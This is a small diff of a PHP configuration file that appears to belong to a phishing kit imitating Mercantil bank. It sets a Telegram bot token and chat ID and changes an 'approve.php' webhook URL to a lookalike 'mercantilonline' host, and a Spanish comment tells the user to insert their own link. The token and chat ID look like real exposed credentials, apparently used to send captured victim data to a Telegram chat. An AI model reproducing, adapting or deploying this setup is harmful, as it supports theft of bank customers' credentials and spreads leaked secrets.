@@ -13,5 +13,5 @@ if (basename($_SERVER['PHP_SELF']) === basename(__FILE__)) {
 // ⚙️ Configuración principal (solo accesible por inclusión)
 $bot_token_2 = '8721074529:AAFSLwoyOoeOhJsoPqutEHNvnH5C4QL5KBw';  
 $chat_id_2   = '-1004378006347';
-$webhook_url = 'https://mercantil30credits.up.railway.app/approve.php'; //Reemplaza (LINK_AQUI) completo, por tu link.
+$webhook_url = 'mercantilonline.up.railway.app/approve.php'; //Reemplaza (LINK_AQUI) completo, por tu link.
 ?>
